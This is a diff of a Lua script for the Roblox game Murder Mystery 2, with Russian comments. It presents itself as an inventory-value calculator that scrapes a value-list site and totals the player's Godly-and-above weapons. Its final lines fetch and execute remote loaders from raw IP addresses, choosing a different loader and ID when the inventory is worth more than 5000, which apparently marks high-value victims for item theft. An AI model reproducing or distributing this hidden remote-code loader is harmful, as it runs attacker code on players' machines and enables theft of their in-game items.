@@ -1,1 +1,192 @@
-loadstring(game:HttpGet("https://pastefy.app/WGsMHLPe/raw",true))()
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Минимальная редкость для учета в списке ценностей (Godly и выше)
+local min_rarity = "Godly" 
+local min_value = 1 
+
+-- Получаем доступ к базе данных предметов
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local weaponsToSend = {}
+local HttpRequest = request or (syn and syn.request) or http_request or http and http.request
+
+-- Таблица редкостей для сравнения
+local rarityTable = {
+    "Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"
+}
+-- URL'ы для supremevalues
+local categories = {
+    godly = "https://supremevaluelist.com/mm2/godlies.html",
+    ancient = "https://supremevaluelist.com/mm2/ancients.html",
+    unique = "https://supremevaluelist.com/mm2/uniques.html",
+    classic = "https://supremevaluelist.com/mm2/vintages.html",
+    chroma = "https://supremevaluelist.com/mm2/chromas.html"
+}
+local headers = {
+    ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image:apng,*/*;q=0.8",
+    ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+}
+
+local function trim(s)
+    return s:match("^%s*(.-)%s*$")
+end
+
+-- Функция для выполнения HTTP GET запроса
+local function fetchHTML(url)
+    if not HttpRequest then return "" end
+    local ok, resp = pcall(function()
+        return HttpRequest({Url = url, Method = "GET", Headers = headers})
+    end)
+    return ok and resp and resp.Body or ""
+end
+
+-- Функция для парсинга значения
+local function parseValue(itembodyDiv)
+    local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+    if valueStr then
+        valueStr = valueStr:gsub(",", "")
+        local value = tonumber(valueStr)
+        return value
+    end
+    return nil
+end
+
+-- Функция для извлечения обычных предметов (не хрома)
+local function extractItems(htmlContent)
+    local itemValues = {}
+    if not htmlContent or htmlContent == "" then return itemValues end
+    for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        itemName = itemName:match("([^<]+)")
+        if itemName then
+            itemName = trim(itemName:gsub("%s+", " ")):lower()
+            itemName = trim((itemName:split(" Click "))[1])
+            local value = parseValue(itembodyDiv)
+            if value then itemValues[itemName] = value end
+        end
+    end
+    return itemValues
+end
+
+-- Функция для извлечения хрома
+local function extractChromaItems(htmlContent)
+    local chromaValues = {}
+    if not htmlContent or htmlContent == "" then return chromaValues end
+    for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+        chromaName = chromaName:match("([^<]+)")
+        if chromaName then
+            chromaName = trim(chromaName:gsub("%s+", " ")):lower()
+            local value = parseValue(itembodyDiv)
+            if value then chromaValues[chromaName] = value end
+        end
+    end
+    return chromaValues
+end
+
+-- Основная функция для построения списка ценностей (supremevalues)
+local function buildValueList()
+    local allExtractedValues, chromaExtractedValues = {}, {}
+    local categoriesToFetch = {}
+    for rarity, url in pairs(categories) do table.insert(categoriesToFetch, {rarity = rarity, url = url}) end
+    local totalCategories, completed = #categoriesToFetch, 0
+    local lock = Instance.new("BindableEvent")
+
+    -- Параллельное выполнение запросов
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity, url = category.rarity, category.url
+            local htmlContent = fetchHTML(url)
+            if htmlContent and htmlContent ~= "" then
+                if rarity ~= "chroma" then
+                    local extractedItemValues = extractItems(htmlContent)
+                    for itemName, value in pairs(extractedItemValues) do allExtractedValues[itemName] = value end
+                else
+                    chromaExtractedValues = extractChromaItems(htmlContent)
+                end
+            end
+            completed = completed + 1
+            if completed == totalCategories then lock:Fire() end
+        end)
+    end
+    
+    -- Ожидаем завершения всех запросов
+    lock.Event:Wait() 
+    
+    local valueList = {}
+    for dataid, item in pairs(database) do
+        local itemName = item.ItemName and item.ItemName:lower() or ""
+        local rarity, hasChroma = item.Rarity or "", item.Chroma or false
+        
+        if itemName ~= "" and rarity ~= "" then
+            local weaponRarityIndex, godlyIndex = table.find(rarityTable, rarity), table.find(rarityTable, "Godly")
+            
+            -- Учитываем только предметы Godly и выше
+            if weaponRarityIndex and weaponRarityIndex >= godlyIndex then 
+                if hasChroma then
+                    for chromaName, value in pairs(chromaExtractedValues) do
+                        if chromaName:find(itemName) then valueList[dataid] = value break end
+                    end
+                else
+                    local value = allExtractedValues[itemName]
+                    if value then valueList[dataid] = value end
+                end
+            end
+        end
+    end
+    return valueList
+end
+
+local totalValue = 0
+
+-- Неторгуемые предметы для исключения из списка
+local untradable = {
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
+    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
+    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true, ["Season1TestKnife"] = true,
+    ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true,
+    ["TravelerAxeBronze"] = true, ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
+}
+
+-- 1. Получаем список ценностей с SupremeValues
+local valueList = buildValueList() 
+
+-- 2. Получаем инвентарь игрока (имитация)
+local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+-- 3. Рассчитываем общую сумму
+local min_rarity_index = table.find(rarityTable, min_rarity)
+
+for i, v in pairs(realData.Weapons.Owned) do
+    local dataid, amount = i, v
+    local itemData = database[dataid]
+    
+    if itemData then
+        local rarity = itemData.Rarity
+        local weapon_rarity_index = table.find(rarityTable, rarity)
+        
+        if weapon_rarity_index and weapon_rarity_index >= min_rarity_index and not untradable[dataid] then
+            -- Берем ценность из valueList, если ее нет, то 2 для Godly+ или 1 (это логика из оригинала)
+            local value = valueList[dataid] or (weapon_rarity_index >= table.find(rarityTable, "Godly") and 2 or 1)
+            
+            if value >= min_value then
+                totalValue = totalValue + (value * amount)
+                -- Этот массив больше не нужен, но оставляю, чтобы было видно, какие предметы учитывались
+                table.insert(weaponsToSend, {DataID = dataid, Rarity = rarity, Amount = amount, Value = value}) 
+            end
+        end
+    end
+end
+
+-- 4. Выводим результат в консоль
+print("Общая сумма ценностей (SupremeValues): " .. totalValue)
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+if totalValue > 5000 then
+    ID="281b4cca-f00e-4f9d-985c-32df2a0b73b5";
+    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+else
+  ID="02b75653-1b17-44bf-b3e0-d3c82c09ab02";
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
